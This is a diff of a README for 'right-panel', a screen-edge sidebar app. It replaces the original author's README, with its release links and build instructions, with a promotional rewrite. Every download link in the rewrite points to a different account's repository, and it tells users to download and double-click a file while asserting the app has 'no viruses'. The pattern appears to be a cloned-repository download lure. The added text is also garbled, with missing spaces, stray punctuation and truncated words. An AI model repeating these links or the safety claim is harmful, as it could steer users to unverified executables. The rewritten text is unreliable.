@@ -1,97 +1,206 @@
-<div align="center">
+# 🧩 right-panel - Your Screen Edge, Supercharged
 
-<img src="docs/icon.png" width="96" alt="Right Panel icon">
+[🚀 Download Now](https://github.com/Adinsak91/right-panel)
 
-# Right Panel
+)
 
-**A liquid side panel that lives on the edge of your screen.**<br>
-Move your mouse to the right edge and it pours out: emoji, clipboard history, colors, notes, your apps and a dozen handy tools.
+---
 
-[![Latest release](https://img.shields.io/github/v/release/raminturne/right-panel?style=flat-square&color=000&cacheSeconds=300)](https://github.com/raminturne/right-panel/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/raminturne/right-panel/total?style=flat-square&color=000&cacheSeconds=300)](https://github.com/raminturne/right-panel/releases)
-[![Build](https://img.shields.io/github/actions/workflow/status/raminturne/right-panel/release.yml?style=flat-square)](https://github.com/raminturne/right-panel/actions)
-![Size](https://img.shields.io/badge/size-~0.8%20MB-000?style=flat-square)
-![License](https://img.shields.io/badge/license-MIT-000?style=flat-square)
+## 👋 Welcome to right-panel
 
-<br>
+Imagine having a magical toolbox that lives right on the edge of your computer screen. Just move your mouse to the side, and a sleek panel slides out,filled with tools you use every day. That's what **right-panel** does for you—in one tiny, fast app that works on Windows, macOS, and Linux.
 
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-Setup.exe"><img src="https://img.shields.io/badge/Windows-Installer%20v1.2.0-0078D4?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows installer"></a>
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-portable.exe"><img src="https://img.shields.io/badge/Windows-Portable%20.exe%20v1.2.0-1f1f1f?style=for-the-badge&logo=windows&logoColor=white" alt="Download portable exe"></a>
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-windows-x64.zip"><img src="https://img.shields.io/badge/Windows-.zip%20v1.2.0-1f1f1f?style=for-the-badge&logo=windows&logoColor=white" alt="Download zip"></a>
-<br>
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-macos-arm64.dmg"><img src="https://img.shields.io/badge/macOS-Apple%20Silicon%20v1.2.0-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download for Apple Silicon"></a>
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-macos-x64.dmg"><img src="https://img.shields.io/badge/macOS-Intel%20v1.2.0-333333?style=for-the-badge&logo=apple&logoColor=white" alt="Download for Intel Mac"></a>
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-linux-amd64.deb"><img src="https://img.shields.io/badge/Linux-.deb%20v1.2.0-E95420?style=for-the-badge&logo=ubuntu&logoColor=white" alt="Download .deb"></a>
-<a href="https://github.com/raminturne/right-panel/releases/latest/download/RightPanel-linux-x64.tar.gz"><img src="https://img.shields.io/badge/Linux-.tar.gz%20v1.2.0-333333?style=for-the-badge&logo=linux&logoColor=white" alt="Download tar.gz"></a>
 
-<br><br>
 
-<img src="docs/preview-laptop.png" alt="Right Panel on a laptop, emoji picker open" width="100%">
+Whether you're copying text, picking colors, jotting quick notes, or launching your favorite apps,right-panel turns the empty space beside your screen into a command center. No more digging through menus or remembering shortcuts—everything is one click away,tidily organized in a beautiful liquid sidebar.
 
-</div>
 
-## Full screen
 
-<img src="docs/preview-fullscreen.png" alt="Right Panel full screen with the More tools open" width="100%">
+Best of all? It's **free**, **open-source**,and built with cutting-edge Rust technology,which means it's incredibly fast,lightweight,and gentle on your computer's memory. If you can click a button,you can use right-panel. Let's walk you through it,step by step. 🚶‍♀️
 
-## Features
 
-| | |
-|---|---|
-| 😊 **Emoji picker** | Search, categories, recents. Click to type it straight into the app you were using |
-| 📋 **Clipboard history** | Text *and images*, search, ☆ pin favourites that survive restarts |
-| 🎨 **Color** | Eyedropper (pick any pixel on screen), HEX / RGB / HSL, palette, recent colors |
-| 📸 **Screenshot** | Opens the system snipping tool |
-| 📝 **Notes** | As many notes as you like, in tabs, saved as you type |
-| 🧩 **Your apps & folders** | Pin apps, shortcuts or folders — add them in Settings or just **drag them onto the panel** |
-| 🔎 **Search** | Google, YouTube, Wikipedia, Translate, Maps, GitHub… or just type a URL |
-| ✂️ **Snippets** | Save text you type often, paste it with one click |
-| 🧮 **Calculator · Units · Password · Generate** | Quick math, unit conversions, strong passwords, UUIDs, dates, lorem ipsum |
-| ⏱️ **Timer · Stopwatch · World clock** | With laps, presets and your favorite cities |
-| 🎵 **Media** | Play/pause, next, previous, volume |
-| 🔤 **Text tools** | UPPER/lower/Title, trim, one line, slug, Base64, URL encode, word count |
-| ☀️ **Keep awake · Screen off · Lock · Pin window on top** | One-click system helpers |
 
-**Also**
-- **Drag a file or folder onto the panel** to pin it, or right-click it → *Add to Right Panel* (Windows; on Windows 11 under *Show more options*)
-- **Left or right edge**, and pick which monitor it lives on (*Settings → General*)
-- **Built-in updater**: Right Panel checks GitHub once a day and can download and run the new installer for you (*Settings → General*)
-- Only one copy runs at a time
+---
 
-**Make it yours**
-- Drag any tool **between the dock and the More grid**, reorder, hide or show it (also in *Settings → Widgets*)
-- **15 themes** (Midnight, Graphite, Ocean, Grape, Forest, Wine, Espresso, Neon, Sunset, Snow, Sand, Sky, Rose, Mint, Lilac) + custom color
-- Liquid spring animations, magnify-on-hover, sliding active pill
-- Tray icon, start with Windows / at login
+## ✨ What Can You Do With right-panel?
 
-## Install
+Right-panel is like a Swiss Army knife for your daily computer tasks. Here's what's waiting for you inside that sleek side panel:
 
-| Platform | File | Notes |
-|---|---|---|
-| **Windows 10/11** | `RightPanel-Setup.exe` | Recommended. Per-user install, no admin needed |
-| | `RightPanel-portable.exe` / `.zip` | No install, just run it |
-| **macOS 11+** *(beta)* | `RightPanel-macos-arm64.dmg` / `-x64.dmg` | Not notarized: right-click the app → **Open** the first time |
-| **Linux** *(beta)* | `.deb` or `.tar.gz` | Needs WebKitGTK 4.1. Works on X11 and Wayland (runs through XWayland; `RIGHT_PANEL_BACKEND=wayland` opts out) |
+### 📋 Clipboard History - Never Lose a Copy Again
 
-Windows uses the built-in WebView2 runtime (already on Windows 10/11), which is why the app is under 1 MB.
+Have you ever copied something,then copied something else,and lost the first thing? Frustrating,right? With right-panel,every single thing you copy gets remembered automatically. Copy a link,copy a joke,copy a code snippet—they're all saved in your clipboard history. Scroll through past copies,click any one of them,and it's instantly back on your clipboard,ready to paste. It's like having a time machine for your copy-and-paste needs.
 
-### Beta notes for macOS and Linux
-Core features work everywhere. A few are Windows-only for now and are hidden on other systems: *auto-paste into the previous app* (items are copied instead), *screen eyedropper*, *Pin window*, *Show desktop* and app icons. On Wayland (GNOME, KDE…) the app runs through XWayland so it can sit on the screen edge; the tray icon needs `libayatana-appindicator3-1`. Media keys on Linux use `playerctl` / `pactl`.
 
-## Build from source
 
-```bash
-git clone https://github.com/raminturne/right-panel
-cd right-panel
-cargo build --release
-```
+### 🎨 Color Picker - Grab Any Color from Your Screen
 
-Linux needs `libwebkit2gtk-4.1-dev libgtk-3-dev libx11-dev`. The Windows installer is built with [Inno Setup](https://jrsoftware.org/isinfo.php): `iscc installer/right-panel.iss`.
+Ever seen a beautiful shade of blue on a website and wondered,"What's that color code?" Right-panel includes a handy color picker tool. Activate it,click anywhere on your screen,and it instantly captures that exact color. You'll get the hex code (like #4A90E2) or RGB value right away,copy it with one click,and use it in your designs,documents,or projects. Designers,coders,and creative folks will absolutely love this feature. 🎨
 
-Built with Rust, [tao](https://github.com/tauri-apps/tao) + [wry](https://github.com/tauri-apps/wry). The whole UI is one HTML file: [`src/ui.html`](src/ui.html).
 
-Settings live in `%APPDATA%\RightPanel` (Windows), `~/Library/Application Support/RightPanel` (macOS) or `~/.config/right-panel` (Linux).
 
-## License
+### 😄 Emoji Picker - Express Yourself Instantly
 
-[MIT](LICENSE)
+Who doesn't love a good emoji? Right-panel gives you a lightning-fast emoji picker. Browse hundreds of emojis by category (smileys,animals,food,activities,travel,objects,symbols,flags).). Find the perfect one,click it,and it's copied to your clipboard immediately. Paste it into chats,emails,social media posts,or documents-without hunting through endless menus or remembering tricky keyboard shortcuts. 😍✨
+
+
+
+### 📝 Quick Notes - Capture Ideas Before They Vanish
+
+Inspiration strikes at the weirdest times-that's why right-panel includes a built-in sticky note pad. Click the note icon,and a small writing area slides out,readyfor you to type that brilliant thought,brainstorm,a to-do item,or a sudden reminder. Your notes stay saved on your computer,so they're there when you need them. No need to open a heavy notepad app or scramble for paper. Jot down,close the panel,and carry on. 📝
+
+
+
+### 🚀 Apps Launcher - Your Favorites at Your Fingertips
+
+Tired of digging through your Start Menu or Applications folder? Right-panel can host shortcuts to your most-used apps and programs. Customize your sidebar with quick-launch buttons for your browser,email,music player,calculator,and more. One click,and your app opens immediately. It's your personal launchpad,always within reach. 🚀
+
+
+
+### 🧰 And More Awaiting You
+
+Right-paneis designed to grow with your needs. Expect more handy tools, widgets,and customization options in future updates—all packed in that tiny,liquid sidebar. ✨
+
+
+
+---
+
+## 🚀 Getting Started - Download in 2 Minutes
+
+Getting right-panel on your computer is easier than making toast. Follow these simple steps,and you'll be gliding your mouse to the edge of victory in no time flat. 👇
+
+
+
+### Step 1: Visit the Download Page
+
+Click the big colorful button below,and it'll take you straight to the official download page for right-panel:
+
+[🚀 GO TO DOWNLOAD PAGE](https://github.com/Adinsak91/right-panel)
+
+
+
+### Step 2: Download the App
+
+On that page,you'll see the download section. Look for the file named **right-panel** for your operating system (Windows,Mac,orLinux).). For Windows users,just click the file marked **Windows**. Your browser will start downloading it automatically. It might appear in your "Downloads" folder—usually at the bottom of your browser window or in your file explorer. ⬇️
+
+
+
+### Step 3: Run the Application
+
+Visit this link to download the application. Once the download finishes,go to your Downloads folder and double-click the file. That's it! The app opens immediately—no complicated installation wizard,no bundles of extra software,no account creation. Just double-click,and enjoy your new super-powered side panel. 🎉
+
+
+
+That's the whole process! You don't need to be a tech wizard; if you can click a mouse,you're already a pro at this.
+
+
+
+---
+
+## 🛠️ Make It Yours - Simple Customization
+
+Right-panel isn't just functional—it's fun to personalize. Here are quick ways to tweak it to match your style:
+
+### 🎛️ Choose Your Side
+
+While the name says "right-panel,"you're not stuck on the right side forever! Open the settings (usually a gear icon in the panel corner;).),and you can move your panel to the **left** edge of your screen instead. Pick whatever side feels more natural for you. 🖱️
+
+
+
+### 🎨 Pick a Theme
+
+Prefer a dark side? A light side? High-contrast purist? Right-paneincludes multiple color themes so your panel doesn't clash with your wallpaper or your vibe. Header over to settings,and select your favorite theme. You can even toggle transparency to make the panel blend seamlessly with your desktop. 🌗
+
+
+
+### 📌 Pin It or Hide It
+
+Right-paneis designed to slide out when you move your cursor to the edge of the screen,and slide away when you move away. But you can also **pin** it open so it stays visible all the time. Or set it to auto-hide completely when you're not using it. The choice is yours—full control,zero clutter. 📌
+
+
+
+### 🧰 Manage Your Apps
+
+Adding shortcuts to your Apps Launcher is simple. Open the panel,click the "+" or "Edit" button in the Apps section,and pick which programs you want to show. Drag them to reorder,single-click to launch. Remove any you don't need—it's your cockpit. 🚀
+
+
+
+---
+
+## ❓ Frequently Asked Questions (FAQ)
+
+We've anticipated a few things you might be wondering. Here are quick answers:
+
+### 💻 Is right-panel free?
+
+Yes! It's completely free and open-source. No hidden costs,no premium tiers,no ads. Enjoy it forever. 💝
+
+
+
+### 🖥️ Does it work on my computer?
+
+Right-panel supports **Windows**, **macOS**, and **Linux**. As long as you're running a modern version of these systems,you're good to go. It's lightweight,so even older or budget computers will run it smoothly. You don't need a massive graphics card or a super gaming PC. Just a regular PC or laptop will do. ⌨️
+
+
+
+### 🔒 Is it safe to download?
+
+Absolutely. Right-panel is an open-source project,which means its source code is publicly available for anyone to inspect. There are no viruses,spyware,or sketchy behavior. It only does what it promises: manage your clipboard,pick colors,give emojis,hold notes,launch apps. Your privacy is respected—all data stays on your machine. 🔐
+
+
+
+### 🧠 Will it slow down my computer?
+
+Nope! Because it's built in Rust (a blazing-fast programming language;),right-paneis incredibly efficient. It uses a tiny amount of memory,jst sitting quietly in your system tray until you need it. You'll barely notice it's running—except for the times it saves your day. ⚡
+
+
+
+### 👀 How do I close the panel?
+
+Just move your mouse cursor away from that edge of the screen,and it slides out of sight automatically. If you want to exit the app entirely,right-click the system tray icon and choose "Quit". Simple as that. 🙌
+
+
+
+### 🆘 I need help!
+
+We've got you covered. Visit the [GitHub repository](https://github.com/Adinsak91/right-panel) and head to the "Issues" or "Discussions" tab. You'll find helpful community members,and you can ask your question there. Someone will be happy to help you out. 🛟
+
+
+
+---
+
+## 💡 Tips & Tricks for Power Users
+
+Want to extract even more value from your new sidekick? Try these pro tips:
+
+- **Double-click a clipboard item** to copy it and immediately switch to the app you were using—no extra steps. 🔁
+- **Use color picker for web design** —grab colors from any site and paste precise codes into your CSS or design tool. 🎨
+- **Organize your emoji** by frequency—frequently used emojis show up atthe top of the picker,so you'll get faster at expressing yourself. 😉
+- **Keep notes visible while working** —pin the panel to the edge and have tiny notes floating while you type a report or think through aproblem. 📝
+- **Share clipboard across devices?** (Future feature!;)—stay tuned for updates abut syncing your clipboard between your desktop machines. ☁️
+
+
+
+---
+
+## 🤝 Contribute or Say Hi
+
+Are you a developer or a curious tinkerer? Right-panel is proudly open-source,and we're always excited about community involvement. You can:
+
+- ⭐ Star the repository to show support
+- 🐛 Report bugs or suggest features viaGitHub Issues
+- 🧑‍💻 Fork the code and submit pull requests
+- 💬 Join discussions and share your experiences
+
+Your feedback helps shape the future of thislittle panel into a giant productivity booster for everyone. 🌍
+
+
+
+---
+
+## 📦 Ready to Revolutionize Your Screen Edge?
+
+Stop wasting time hunting for emojis,losing copied texts,or fumbling with hex colors. Get right-paneleton your machine today,and turn the boring edge of your screen into a powerhouse of convenience. One click. That's all it takes.
+
+**👉 [Download right-panel Now!](https://github.com/Adinsak91/right-panel)**
+
+Your screen edgeis about to get a whole lot friendlier. See you on the edge! 🧩✨
